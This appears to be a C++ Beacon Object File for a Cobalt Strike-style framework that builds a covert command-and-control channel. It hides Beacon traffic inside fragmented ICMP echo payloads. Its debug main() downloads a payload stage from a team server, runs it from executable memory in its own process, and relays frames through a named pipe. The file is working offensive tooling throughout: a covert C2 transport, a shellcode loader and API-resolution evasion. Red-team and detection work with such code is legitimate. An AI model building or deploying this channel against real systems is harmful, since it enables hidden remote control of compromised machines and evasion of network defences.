#include <Windows.h>
#include <iphlpapi.h>
#include <IcmpAPI.h>
#include "base/helpers.h"
#include "udc2.h"
#include "udc2_icmp.h"

/**
 * For the debug build we want:
 *   a) Undefine DECLSPEC_IMPORT
 */
#ifdef _DEBUG
#undef DECLSPEC_IMPORT
#define DECLSPEC_IMPORT
#include <string>
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "iphlpapi.lib")
#endif

extern "C" {

#ifndef _DEBUG
    NTSYSAPI ULONG RtlRandomEx(PULONG Seed);
#else
    typedef ULONG(NTSYSAPI* RtlRandomExPtr)(PULONG);
#endif

    // Dynamic Function Resolution declarations
    DFR(IPHLPAPI, IcmpCreateFile);
    DFR(IPHLPAPI, IcmpSendEcho);
    DFR(IPHLPAPI, IcmpCloseHandle);
    DFR(KERNEL32, HeapAlloc);
    DFR(KERNEL32, GetProcessHeap);
    DFR(KERNEL32, HeapFree);
    DFR(KERNEL32, OutputDebugStringA);
    DFR(KERNEL32, GetTickCount);
    DFR(KERNEL32, Sleep);
#ifndef _DEBUG
    DFR(NTDLL, RtlRandomEx);
#endif
    DFR(WS2_32, inet_addr);

    #define HeapAlloc KERNEL32$HeapAlloc
    #define GetProcessHeap KERNEL32$GetProcessHeap
    #define HeapFree KERNEL32$HeapFree
    #define OutputDebugStringA KERNEL32$OutputDebugStringA
    #define GetTickCount KERNEL32$GetTickCount
    #define Sleep KERNEL32$Sleep
#ifndef _DEBUG
    #define RtlRandomEx NTDLL$RtlRandomEx
#endif
    #define inet_addr WS2_32$inet_addr
    #define IcmpCreateFile IPHLPAPI$IcmpCreateFile
    #define IcmpSendEcho IPHLPAPI$IcmpSendEcho
    #define IcmpCloseHandle IPHLPAPI$IcmpCloseHandle

    // Global state
    static UDC2_STATE gUdc2State;

    /**
     * @brief Alternative memcpy for BOF
     * @param dest Destination buffer pointer
     * @param destSize Size of the destination buffer in bytes
     * @param src Source buffer pointer
     * @param copySize Number of bytes to copy
     * @return UDC2_SUCCESS on success, UDC2_ERROR_INVALID_PARAM on parameter validation failure
     */
#pragma optimize("", off)
    static int secureMemCopy(void* dest, SIZE_T destSize, const void* src, SIZE_T copySize) {
        const char*     srcPtr;
        SIZE_T          i;
        char*           destPtr;

        if (!dest || !src || copySize == 0) {
            return UDC2_ERROR_INVALID_PARAM;
        }

        if (copySize > destSize) {
            return UDC2_ERROR_INVALID_PARAM;
        }

        destPtr = (char*)dest;
        srcPtr = (const char*)src;

        for (i = 0; i < copySize; i++) {
            destPtr[i] = srcPtr[i];
        }

        return UDC2_SUCCESS;
    }
#pragma optimize("", on)

    /**
     * @brief String comparison
     * @param s1 First string to compare
     * @param s2 Second string to compare with first
     * @return 0 if strings are equal
     */
    static int strCompare(const char* s1, const char* s2) {
        while (*s1 && (*s1 == *s2)) {
            s1++;
            s2++;
        }
        return *(unsigned char*)s1 - *(unsigned char*)s2;
    }

    /**
     * @brief Parameter validation
     * @param buffer Buffer pointer to validate
     * @param length Length of the buffer to validate
     * @param checkOutput Whether to validate the output parameter
     * @param output Output parameter pointer to validate if checkOutput is TRUE
     * @return UDC2_SUCCESS on validation success, UDC2_ERROR_INVALID_PARAM on validation failure
     */
    static int validateParameters(const void* buffer, int length, BOOL checkOutput, void** output) {
        if (!buffer) {
            return UDC2_ERROR_INVALID_PARAM;
        }

        if (length <= 0 || length > MAX_FRAME_SIZE) {
            return UDC2_ERROR_INVALID_PARAM;
        }

        if (checkOutput && !output) {
            return UDC2_ERROR_INVALID_PARAM;
        }

        return UDC2_SUCCESS;
    }

    /**
     * @brief Safe heap allocation
     * @param ptr Pointer to store the allocated memory address
     * @param size Size of memory to allocate in bytes
     * @return UDC2_SUCCESS on successful allocation, UDC2_ERROR_INVALID_PARAM on invalid parameters, UDC2_ERROR_MEMORY_ALLOC on allocation failure
     */
    static int safeHeapAlloc(void** ptr, SIZE_T size) {
        if (!ptr || size == 0) {
            return UDC2_ERROR_INVALID_PARAM;
        }

        *ptr = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, size);
        if (!*ptr) {
            return UDC2_ERROR_MEMORY_ALLOC;
        }

        return UDC2_SUCCESS;
    }

    /**
     * @brief Safe heap deallocation
     * @param ptr Pointer to the memory address to deallocate
     */
    static void safeHeapFree(void** ptr) {
        if (ptr && *ptr) {
            HeapFree(GetProcessHeap(), 0, *ptr);
            *ptr = NULL;
        }
    }

    /**
     * @brief Packet list initialization
     * @param list Pointer to the PacketList structure to initialize
     * @return UDC2_SUCCESS on successful initialization, UDC2_ERROR_INVALID_PARAM if list is NULL
     */
    int initPacketList(PacketList* list) {
        if (!list) {
            return UDC2_ERROR_INVALID_PARAM;
        }

        list->head = NULL;
        list->tail = NULL;
        return UDC2_SUCCESS;
    }

    /**
     * @brief Packet allocation
     * @param list Pointer to the PacketList to add the packet to
     * @param size Size of the packet data buffer to allocate
     * @return Pointer to the allocated PacketNode on success, NULL on failure
     */
    PacketNode* allocatePacket(PacketList* list, UINT32 size) {
        PacketNode*     node = NULL;
        int             result;

        if (!list || size == 0 || size > MAX_ICMP_PAYLOAD_SIZE) {
            return NULL;
        }

        // Allocate node structure
        result = safeHeapAlloc((void**)&node, sizeof(PacketNode));
        if (result != UDC2_SUCCESS) {
            return NULL;
        }

        // Allocate packet data buffer
        result = safeHeapAlloc(&node->data, size);
        if (result != UDC2_SUCCESS) {
            safeHeapFree((void**)&node);
            return NULL;
        }

        node->size = size;
        node->next = NULL;

        // Add to list
        if (!list->head) {
            list->head = node;
            list->tail = node;
        }
        else {
            list->tail->next = node;
            list->tail = node;
        }

        return node;
    }

    /**
     * @brief Packet retrieval
     * @param list Pointer to the PacketList to retrieve packet from
     * @return Pointer to the packet data on success, NULL if list is empty or invalid
     */
    void* retrievePacket(PacketList* list) {
        PacketNode*     node;
        void*           data;

        if (!list || !list->head) {
            return NULL;
        }

        node = list->head;
        data = node->data;

        // Update list pointers
        list->head = node->next;
        if (!list->head) {
            list->tail = NULL;
        }

        // Free node structure (data is returned to caller)
        node->data = NULL; // Prevent double-free
        safeHeapFree((void**)&node);

        return data;
    }

    /**
     * @brief Packet list cleanup
     * @param list Pointer to the PacketList to cleanup
     */
    void freePacketList(PacketList* list) {
        PacketNode*     current;
        PacketNode*     next;

        if (!list) {
            return;
        }

        current = list->head;
        while (current) {
            next = current->next;
            safeHeapFree(&current->data);
            safeHeapFree((void**)&current);
            current = next;
        }

        list->head = NULL;
        list->tail = NULL;
    }

    /**
     * @brief Safe ICMP handle creation
     * @param handle Pointer to store the created ICMP handle
     * @return UDC2_SUCCESS on successful handle creation, UDC2_ERROR_INVALID_PARAM if handle is NULL, UDC2_ERROR_NETWORK on creation failure
     */
    static int createIcmpHandle(HANDLE* handle) {
        if (!handle) {
            return UDC2_ERROR_INVALID_PARAM;
        }

        *handle = IcmpCreateFile();
        if (*handle == INVALID_HANDLE_VALUE) {
            return UDC2_ERROR_NETWORK;
        }

        return UDC2_SUCCESS;
    }

    /**
     * @brief Safe ICMP handle cleanup
     * @param handle Pointer to the ICMP handle to cleanup
     */
    static void cleanupIcmpHandle(HANDLE* handle) {
        if (handle && *handle != INVALID_HANDLE_VALUE) {
            IcmpCloseHandle(*handle);
            *handle = INVALID_HANDLE_VALUE;
        }
    }

    /**
     * @brief Validate ICMP reply structure and content
     * @param reply Pointer to the ICMP echo reply structure
     * @param expectAck Whether to expect an acknowledgment type reply
     * @return UDC2_SUCCESS on valid reply, UDC2_ERROR_PROTOCOL on validation failure
     */
    static int validateIcmpReply(PICMP_ECHO_REPLY reply, BOOL expectAck) {
        PICMP_HEADER header;

        if (!reply || !reply->Data) {
            return UDC2_ERROR_PROTOCOL;
        }

        if (reply->DataSize < sizeof(ICMP_HEADER)) {
            return UDC2_ERROR_PROTOCOL;
        }

        header = (PICMP_HEADER)reply->Data;

        if (expectAck && header->Type != TYPE_ACK) {
            return UDC2_ERROR_PROTOCOL;
        }

        return UDC2_SUCCESS;
    }

    /**
     * @brief Send the actual packet using IcmpSendEcho, making several attempts before considering it a failure
     * @param handle ICMP handle to use for sending
     * @param buffer Buffer containing data to send
     * @param length Length of data to send
     * @param replyBuffer Pointer to store the reply buffer (optional, can be NULL)
     * @return UDC2_SUCCESS on successful send, UDC2_ERROR_INVALID_PARAM on parameter validation failure, UDC2_ERROR_MEMORY_ALLOC on allocation failure, UDC2_ERROR_TIMEOUT on send timeout
     */
    static int sendIcmpWithRetry(HANDLE handle, void* buffer, int length, void** replyBuffer) {
        LPVOID     replyBuf = NULL;
        DWORD      result;
        DWORD      serverAddr;
        int        attempts = MAX_RETRY_ATTEMPTS;
        int        status;

        if (handle == INVALID_HANDLE_VALUE || !buffer || length <= 0) {
            return UDC2_ERROR_INVALID_PARAM;
        }

        // Convert server address
        serverAddr = inet_addr(gUdc2State.serverAddr);
        if (serverAddr == INADDR_NONE) {
            return UDC2_ERROR_INVALID_PARAM;
        }

        // Allocate reply buffer
        status = safeHeapAlloc(&replyBuf, sizeof(ICMP_ECHO_REPLY) + MAX_ICMP_PACKET_SIZE);
        if (status != UDC2_SUCCESS) {
            return status;
        }

        // Make several attempts to send and receive a response
        while (attempts > 0) {
            result = IcmpSendEcho(
                handle,
                serverAddr,
                buffer,
                (WORD)length,
                NULL,
                replyBuf,
                sizeof(ICMP_ECHO_REPLY) + MAX_ICMP_PACKET_SIZE,
                ICMP_TIMEOUT_MS
            );

            if (result > 0) {
                if (replyBuffer) {
                    *replyBuffer = replyBuf;
                }
                else {
                    safeHeapFree(&replyBuf);
                }
                return UDC2_SUCCESS;
            }

            attempts--;
            if (attempts > 0) {
                Sleep(100 * (MAX_RETRY_ATTEMPTS - attempts)); 
            }
        }

        // All attempts failed
        safeHeapFree(&replyBuf);
        return UDC2_ERROR_TIMEOUT;
    }

    /**
     * @brief Sends out an ICMP echo request with our data embedded in the payload of the ICMP request
     * @param buffer Buffer containing data to send
     * @param length Length of data to send
     * @param ackOnly Whether to expect only acknowledgment (TRUE) or data reply (FALSE)
     * @param ppvData Pointer to store reply data (required if ackOnly is FALSE)
     * @return UDC2_SUCCESS on successful operation, various UDC2_ERROR codes on failure
     */
    int sendIcmpData(void* buffer, int length, BOOL ackOnly, void** ppvData) {
        HANDLE     icmpHandle = INVALID_HANDLE_VALUE;
        void*      replyBuffer = NULL;
        int        result;

        result = validateParameters(buffer, length, !ackOnly, ppvData);
        if (result != UDC2_SUCCESS) {
            return result;
        }

        // Create ICMP handle
        result = createIcmpHandle(&icmpHandle);
        if (result != UDC2_SUCCESS) {
            return result;
        }

        // Send and retry with a limited number of attempts until received
        result = sendIcmpWithRetry(icmpHandle, buffer, length, &replyBuffer);
        if (result != UDC2_SUCCESS) {
            cleanupIcmpHandle(&icmpHandle);
            return result;
        }

        // Process reply
        if (ackOnly) {
            result = validateIcmpReply((PICMP_ECHO_REPLY)replyBuffer, TRUE);
            safeHeapFree(&replyBuffer);
        }
        else {
            result = validateIcmpReply((PICMP_ECHO_REPLY)replyBuffer, FALSE);
            if (result == UDC2_SUCCESS) {
                *ppvData = replyBuffer;
            }
            else {
                safeHeapFree(&replyBuffer);
            }
        }

        cleanupIcmpHandle(&icmpHandle);
        return result;
    }

    /**
     * @brief Calculates the number of packets needed for our payload and creates them with appropriate
     * headers, handling fragmentation where needed.
     * @param len Total length of data to be sent
     * @return UDC2_SUCCESS on successful packet creation, UDC2_ERROR_INVALID_PARAM on invalid 
     * length, UDC2_ERROR_MEMORY_ALLOC on allocation failure
     */
    int createIcmpPackets(int len) {
        PacketNode*     packet;
        ICMP_HEADER     header;
        int             numPackets;
        int             result;
        int             i;

        if (len <= 0 || len > MAX_FRAME_SIZE) {
            return UDC2_ERROR_INVALID_PARAM;
        }

        // Calculate required packets
        numPackets = (len + MAX_ICMP_PACKET_SIZE - 1) / MAX_ICMP_PACKET_SIZE;
        if (numPackets <= 0) {
            return UDC2_ERROR_INVALID_PARAM;
        }

        // Create the required number of packets to send
        for (i = 0; i < numPackets; i++) {
            // Setup header with proper fragmentation flags
            header.Type = TYPE_BEACON_DATA;
            header.Identifier = gUdc2State.beaconId & BEACON_ID_MASK;
            header.FragmentIndex = i;

            if (numPackets == 1) {
                header.Flags = 0; 
            }
            else if (i == 0) {
                header.Flags = FRAGMENTED | FIRST_FRAG;
            }
            else if (i == numPackets - 1) {
                header.Flags = FRAGMENTED | LAST_FRAG;
            }
            else {
                header.Flags = FRAGMENTED;
            }

            // Allocate packet
            packet = allocatePacket(&gUdc2State.packetList, MAX_ICMP_PAYLOAD_SIZE);
            if (!packet) {
                freePacketList(&gUdc2State.packetList);
                return UDC2_ERROR_MEMORY_ALLOC;
            }

            // Copy header
            result = secureMemCopy(packet->data, packet->size, &header, sizeof(header));
            if (result != UDC2_SUCCESS) {
                freePacketList(&gUdc2State.packetList);
                return result;
            }
        }

        return UDC2_SUCCESS;
    }

    /**
     * @brief Copies our payload and sends all outbound packets, handling fragmentation when needed
     * @param data Data buffer to send
     * @param len Length of data to send
     * @return UDC2_SUCCESS on successful send, UDC2_ERROR_INVALID_PARAM on invalid parameters, UDC2_ERROR_FRAGMENTATION on fragmentation errors
     */
    int sendIcmpPackets(const char* data, int len) {
        PICMP_HEADER     header;
        void*            packetData;
        int              copied = 0;
        int              remaining = len;
        int              copySize;
        int              result;

        if (!data || len <= 0) {
            return UDC2_ERROR_INVALID_PARAM;
        }

        // Process all packets in the list
        while ((packetData = retrievePacket(&gUdc2State.packetList)) != NULL) {
            header = (PICMP_HEADER)packetData;

            // Calculate copy size based on fragmentation
            if (header->Flags & FRAGMENTED) {
                if (header->Flags & LAST_FRAG) {
                    copySize = remaining;
                }
                else {
                    copySize = MAX_ICMP_PAYLOAD_SIZE - sizeof(ICMP_HEADER);
                }
            }
            else {
                copySize = len;
            }

            // Quick bounds check
            if (copySize > remaining || copySize <= 0) {
                safeHeapFree(&packetData);
                freePacketList(&gUdc2State.packetList);
                return UDC2_ERROR_FRAGMENTATION;
            }

            // Copy payload data after header
            result = secureMemCopy(
                (char*)packetData + sizeof(ICMP_HEADER),
                MAX_ICMP_PAYLOAD_SIZE - sizeof(ICMP_HEADER),
                data + copied,
                copySize
            );

            if (result != UDC2_SUCCESS) {
                safeHeapFree(&packetData);
                freePacketList(&gUdc2State.packetList);
                return result;
            }

            // Send packet
            result = sendIcmpData(
                packetData,
                sizeof(ICMP_HEADER) + copySize,
                TRUE,
                NULL
            );

            safeHeapFree(&packetData);

            if (result != UDC2_SUCCESS) {
                freePacketList(&gUdc2State.packetList);
                return result;
            }

            copied += copySize;
            remaining -= copySize;
        }

        return UDC2_SUCCESS;
    }

    /**
     * @brief Validate and process ICMP fragmented replies
     * @param reply Pointer to the reply buffer (will be freed during processing)
     * @param frameLen Expected total frame length
     * @param read Buffer to store the assembled frame data
     * @return Number of bytes copied on success, negative UDC2_ERROR codes on failure
     */
    int processFragments(void** reply, int frameLen, char* read) {
        PICMP_ECHO_REPLY     icmpReply;
        PICMP_HEADER         icmpHeader;
        ICMP_HEADER          requestHeader;
        BOOL                 complete = FALSE;
        int                  copied = 0;
        int                  remaining = frameLen;
        int                  result;
        int                  copySize;

        if (!reply || !*reply || !read || frameLen <= 0) {
            return UDC2_ERROR_INVALID_PARAM;
        }

        icmpReply = (PICMP_ECHO_REPLY)*reply;
        icmpHeader = (PICMP_HEADER)icmpReply->Data;

        // Validate first fragment
        if (!(icmpHeader->Flags & FIRST_FRAG)) {
            safeHeapFree(reply);
            return UDC2_ERROR_FRAGMENTATION;
        }

        // Copy first fragment
        copySize = MAX_ICMP_PAYLOAD_SIZE - sizeof(ICMP_HEADER);
        if (copySize > remaining) {
            copySize = remaining;
        }

        result = secureMemCopy(read, frameLen, (char*)icmpHeader + sizeof(ICMP_HEADER), copySize);
        if (result != UDC2_SUCCESS) {
            safeHeapFree(reply);
            return result;
        }

        copied += copySize;
        remaining -= copySize;

        // Request subsequent fragments
        while (!complete && remaining > 0) {
            requestHeader.Type = TYPE_REQUEST_TS_REPLY;
            requestHeader.Identifier = gUdc2State.beaconId & BEACON_ID_MASK;
            requestHeader.Flags = FETCH_FRAG;
            requestHeader.FragmentIndex = icmpHeader->FragmentIndex + 1;

            safeHeapFree(reply);

            result = sendIcmpData(&requestHeader, sizeof(requestHeader), FALSE, reply);
            if (result != UDC2_SUCCESS) {
                return result;
            }

            icmpReply = (PICMP_ECHO_REPLY)*reply;
            icmpHeader = (PICMP_HEADER)icmpReply->Data;

            // Process fragment
            if (icmpHeader->Flags & LAST_FRAG) {
                complete = TRUE;
                copySize = remaining;
            }
            else if (icmpHeader->Flags & FRAGMENTED) {
                copySize = MAX_ICMP_PAYLOAD_SIZE - sizeof(ICMP_HEADER);
                if (copySize > remaining) {
                    copySize = remaining;
                }
            }
            else {
                safeHeapFree(reply);
                return UDC2_ERROR_FRAGMENTATION;
            }

            result = secureMemCopy(
                read + copied,
                frameLen - copied,
                (char*)icmpHeader + sizeof(ICMP_HEADER),
                copySize
            );

            if (result != UDC2_SUCCESS) {
                safeHeapFree(reply);
                return result;
            }

            copied += copySize;
            remaining -= copySize;
        }

        safeHeapFree(reply);
        return copied;
    }

    /**
     * @brief Validate and process replies from our UDC2 server
     * @param read Buffer to store the received data
     * @param readLen Maximum length of the read buffer
     * @return Number of bytes received on success, negative UDC2_ERROR codes on failure
     */
    int recvReply(char* read, int readLen) {
        PICMP_ECHO_REPLY     icmpReply;
        PICMP_HEADER         icmpHeader;
        ICMP_HEADER          header;
        void*                reply = NULL;
        int                  frameLen;
        int                  result;

        if (!read || readLen <= 0) {
            return UDC2_ERROR_INVALID_PARAM;
        }

        // Setup request header
        header.Type = TYPE_REQUEST_TS_REPLY;
        header.Identifier = gUdc2State.beaconId & BEACON_ID_MASK;
        header.Flags = 0;
        header.FragmentIndex = 0;

        // Send request and get reply
        result = sendIcmpData(&header, sizeof(header), FALSE, &reply);
        if (result != UDC2_SUCCESS) {
            return result;
        }

        icmpReply = (PICMP_ECHO_REPLY)reply;
        icmpHeader = (PICMP_HEADER)icmpReply->Data;

        // Validate reply type
        if (icmpHeader->Type != TYPE_TASK) {
            safeHeapFree(&reply);
            return UDC2_ERROR_PROTOCOL;
        }

        // Extract and validate frame length
        if (icmpReply->DataSize < sizeof(ICMP_HEADER) + sizeof(int)) {
            safeHeapFree(&reply);
            return UDC2_ERROR_PROTOCOL;
        }

        frameLen = *(int*)((char*)icmpHeader + sizeof(ICMP_HEADER));
        frameLen += sizeof(int); // Include frame length field in total

        if (frameLen <= 0 || frameLen > readLen) {
            safeHeapFree(&reply);
            return UDC2_ERROR_INVALID_PARAM;
        }

        // Handle single packet or fragmented response
        if (!(icmpHeader->Flags & FRAGMENTED)) {
            result = secureMemCopy(read, readLen, (char*)icmpHeader + sizeof(ICMP_HEADER), frameLen);
            safeHeapFree(&reply);
            if (result != UDC2_SUCCESS) {
                return result;
            }
            return frameLen;
        }
        else {
            return processFragments(&reply, frameLen, read);
        }
    }

    /**
     * @brief Beacon calls this function to send/receive encrypted frame data
     * via the UDC2 channel. The sendBuf parameter points to the outgoing frame
     * data and the recvBuf parameter expects to receive the response. This is in
     * effect a proxy function as it intercepts the outbound and inbound frame
     * data.
     *
     * Note:
     *     - Send the sendBuf data to the UDC2 server
     *     - Copy the relayed response frame into recvBuf
     *     - Return the total number of bytes copied to recvBuf
     *     - Return -1 to indicate an error condition
     *     - A return value of -1 or 0 causes Beacon to reset the session
     *
     *
     * @param sendBuf Points to Beacon frame data that needs to be sent out
     * @param sendBufLen The total length of the frame data
     * @param recvBuf Points to Beacon memory that you should copy response frame data to
     * @param recvBufMaxLen The max size of the recv buffer. Do not copy data past this length.
     * Note that this size can be controlled by the tasks_max_size malleable c2 profile setting. It
     * defaults to 1 MB.
     * @return The total number of bytes copied to recvBuf or -1 on any failure
     */
    int udc2Proxy(const char* sendBuf, int sendBufLen, char* recvBuf, int recvBufMaxLen) {
        int result;

        if (!gUdc2State.initialized) {
            return UDC2_ERROR_INVALID_PARAM;
        }

        // Validate all parameters
        if (!sendBuf || sendBufLen <= 0 || !recvBuf || recvBufMaxLen <= 0) {
            return UDC2_ERROR_INVALID_PARAM;
        }

        if (sendBufLen > MAX_FRAME_SIZE) {
            return UDC2_ERROR_INVALID_PARAM;
        }

        // Create packets based on size of outgoing frame data
        result = createIcmpPackets(sendBufLen);
        if (result != UDC2_SUCCESS) {
            return result;
        }

        // Send all packets
        result = sendIcmpPackets(sendBuf, sendBufLen);
        if (result != UDC2_SUCCESS) {
            return result;
        }

        // Receive reply
        return recvReply(recvBuf, recvBufMaxLen);
    }

    /**
     * @brief Called by beacon when closing the UDC2 channel. This should be used for any cleanup
     * you may need to perform.
     */
    void udc2Close() {
        if (gUdc2State.initialized) {
            freePacketList(&gUdc2State.packetList);
            gUdc2State.initialized = FALSE;
        }
    }

    /**
     * @brief Initializes global state
     * @return UDC2_SUCCESS on successful initialization, UDC2_ERROR codes on failure
     */
    int init() {
        DWORD     tick;
        int       result;

        gUdc2State.initialized = FALSE;

        result = initPacketList(&gUdc2State.packetList);
        if (result != UDC2_SUCCESS) {
            return result;
        }

        // Generate random beacon id
        tick = GetTickCount();
#ifdef _DEBUG
        {
            HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
            if (hNtdll) {
                FARPROC pRtlRandomEx = GetProcAddress(hNtdll, "RtlRandomEx");
                if (pRtlRandomEx) {
                    gUdc2State.beaconId = ((RtlRandomExPtr)pRtlRandomEx)(&tick);
                }
                else {
                    gUdc2State.beaconId = tick;
                }
            }
            else {
                gUdc2State.beaconId = tick;
            }
        }
#else
        gUdc2State.beaconId = RtlRandomEx(&tick);
#endif
        gUdc2State.serverAddr = "127.0.0.1"; // TODO: SET THIS TO YOUR UDC2 SERVER ADDRESS
        gUdc2State.initialized = TRUE;

        return UDC2_SUCCESS;
    }

    /**
     * @brief The UDC2 BOF entry point. Beacon calls this function to initialize the
     * UDC2 BOF and passes a pointer to a UDC2_INFO structure as the args parameter.
     * You must populate the struct members with your udc2Proxy and udc2Close functions,
     * otherwise beacon will assume an error has occurred and exit. This is where any
     * initialization you need for your UDC2 channel should occur.
     *
     * @param args Pointer to a UDC2_INFO structure
     * @param len Length of the args buffer
     */
    void go(char* args, int len) {
        PUDC2_INFO info;
        
        int result;

        if (!args) 
            return;

        info = (PUDC2_INFO)args;

        // Initialize our ICMP BOF
        result = init();
        if (result != UDC2_SUCCESS) 
            return;

        // Reminder to set the serverAddr to your UDC2 server. For demo purposes only.
        if (strCompare(gUdc2State.serverAddr, "127.0.0.1") == 0) {
#ifdef _DEBUG
            printf("Default servAddr. Exiting.\n");
#else
            OutputDebugStringA("Default servAddr. Exiting.");
#endif
            gUdc2State.initialized = FALSE;
            freePacketList(&gUdc2State.packetList);
            return;
        }

        // Set function pointers
        info->proxyCall = udc2Proxy;
        info->proxyClose = udc2Close;
    }
}

// Define a main function for the debug build
#if defined(_DEBUG)

#define PAYLOAD_MAX_SIZE 512 * 1024
/**
* BUFFER_MAX_SIZE mocks the tasks_max_size malleable c2 profile setting. It
* is passed as the frameBufferMaxLen value to your udc2 proxy function.
* NOTE: If you change the tasks_max_size to something other than the
* default (which is 1 MB), you should also change BUFFER_MAX_SIZE to match
* it when testing code.
*/
#define BUFFER_MAX_SIZE 1024 * 1024

// read a frame from a file
DWORD readFrame(HANDLE myHandle, char* buffer, DWORD max) {
    DWORD size = 0, temp = 0, total = 0;

    // read the 4-byte length
    ReadFile(myHandle, (char*)&size, 4, &temp, NULL);

    // read the whole thing in
    while (total < size) {
        ReadFile(myHandle, buffer + total, size - total, &temp, NULL);
        total += temp;
    }

    return size;
}

// receive a frame from a socket
DWORD recvFrame(SOCKET mySocket, char* buffer, DWORD max) {
    DWORD size = 0, total = 0, temp = 0;

    // read the 4-byte length
    recv(mySocket, (char*)&size, 4, 0);

    // read in the result
    while (total < size) {
        temp = recv(mySocket, buffer + total, size - total, 0);
        total += temp;
    }

    return size;
}

// send a frame via a socket
void sendFrame(SOCKET mySocket, char* buffer, int length) {
    send(mySocket, (char*)&length, 4, 0);
    send(mySocket, buffer, length, 0);
}

// write a frame to a file
void writeFrame(HANDLE myHandle, char* buffer, DWORD length) {
    DWORD wrote = 0;
    WriteFile(myHandle, (void*)&length, 4, &wrote, NULL);
    WriteFile(myHandle, buffer, length, &wrote, NULL);
}

/*******************************************************************
 * @brief This function retrieves a Beacon payload and injects it into
 * the current process. This allows the Debug Beacon to mock how the UDC2
 * Beacon functions.
 * 
 * NOTE: This is for Debug purposes only and is not intended to
 * replace the need for a UDC2 server.
 * 
 * 1. Set up a UDC2 listener (select debug-only)
 * 2. Update the UDC2_DEBUG_HOST and UDC2_DEBUG_PORT variables
 * 3. Start the example UDC2 server 
 * 4. Select "Local Windows Debugger"
********************************************************************/
int main(int argc, char* argv[]) {
    struct sockaddr_in 	sock;
    UDC2_INFO           udc2Info = { 0 };
    WSADATA             wsaData;
    WORD                wVersionRequested;
    LPCSTR              UDC2_DEBUG_HOST = "127.0.0.1"; // SET THIS TO YOUR UDC2 LISTENER HOST (Team Server)
    USHORT              UDC2_DEBUG_PORT = 2222; // SET THIS TO YOUR UDC2 LISTENER PORT

    wVersionRequested = MAKEWORD(2, 2);
    sock.sin_family = AF_INET;
    sock.sin_addr.s_addr = inet_addr(UDC2_DEBUG_HOST);
    sock.sin_port = htons(UDC2_DEBUG_PORT);

    // initialize the udc2 bof
    go((char*)&udc2Info, 0);

    if (!udc2Info.proxyCall || !udc2Info.proxyClose) {
        printf("UDC2 functions not initialized properly.\n");
        return -1;
    }

    WSAStartup(wVersionRequested, &wsaData);

    // attempt to connect to udc2 listener
    SOCKET socketUDC2 = socket(AF_INET, SOCK_STREAM, 0);
    if (connect(socketUDC2, (struct sockaddr*)&sock, sizeof(sock))) {
        printf(
            "Could not connect to %s:%d. Make sure you have a UDC2 debug-only listener set up.\n", 
            UDC2_DEBUG_HOST, 
            UDC2_DEBUG_PORT
        );
        exit(0);
    }

    /**
    * Grab the correct smb Beacon for our arch.
    *
    * NOTE: arch, block, pipename, and debugpayload
    * commands are only available to debug-only udc2
    * listeners and only intended for use by this
    * VS project.
    */
#ifdef _M_X64
    sendFrame(socketUDC2, (char*)"arch=x64", 8);
#else
    sendFrame(socketUDC2, (char*)"arch=x86", 8);
#endif
    sendFrame(socketUDC2, (char*)"block=100", 9);
    sendFrame(socketUDC2, (char*)"pipename=udc2_debug", 19);

    // request our stage
    sendFrame(socketUDC2, (char*)"debugpayload", 12);

    // receive our stage
    char* payload = (char*)VirtualAlloc(0, PAYLOAD_MAX_SIZE, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    recvFrame(socketUDC2, payload, PAYLOAD_MAX_SIZE);

    closesocket(socketUDC2);

    // execute the payload stage in the current process
    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)payload, (LPVOID)NULL, 0, NULL);

    // connect to our Beacon named pipe
    HANDLE handle_beacon = INVALID_HANDLE_VALUE;
    while (handle_beacon == INVALID_HANDLE_VALUE) {
        Sleep(1000);
        handle_beacon = CreateFileA("\\\\.\\pipe\\udc2_debug", GENERIC_READ | GENERIC_WRITE,
            0, NULL, OPEN_EXISTING, SECURITY_SQOS_PRESENT | SECURITY_ANONYMOUS, NULL);
    }

    // setup our buffers
    char* buffer = (char*)malloc(BUFFER_MAX_SIZE); // 1MB should do
    char* read_buffer = (char*)malloc(BUFFER_MAX_SIZE); // 1MB should do

    // relay frames back and forth
    while (TRUE) {
        // if Beacon exits, bail
        DWORD waitRes = WaitForSingleObject(hThread, 0);
        if (waitRes == WAIT_OBJECT_0)
            break;

        // read from our named pipe Beacon
        DWORD read = readFrame(handle_beacon, buffer, BUFFER_MAX_SIZE);
        if (read < 0) {
            break;
        }

        // rebuild the frame so it starts with the frame length
        char* out = (char*)malloc(read + 4);
        memcpy(out, &read, sizeof(int));
        memcpy(out + sizeof(int), buffer, read);

        // invoke our udc2 proxy to relay the data and recv the response
        read = udc2Info.proxyCall(out, sizeof(int) + read, read_buffer, BUFFER_MAX_SIZE);
        free(out);
        if (read < 0)
            break;

        // write to our named pipe Beacon, adjusting for frame length since
        // the proxy call returns the full frame data from the UDC2 server
        writeFrame(handle_beacon, read_buffer + sizeof(int), read - sizeof(int));
    }

    udc2Info.proxyClose();
    // close our handles
    CloseHandle(handle_beacon);
    CloseHandle(hThread);
    free(read_buffer);
    free(buffer);
    VirtualFree(payload, 0, MEM_RELEASE);

    return 0;
}

#endif
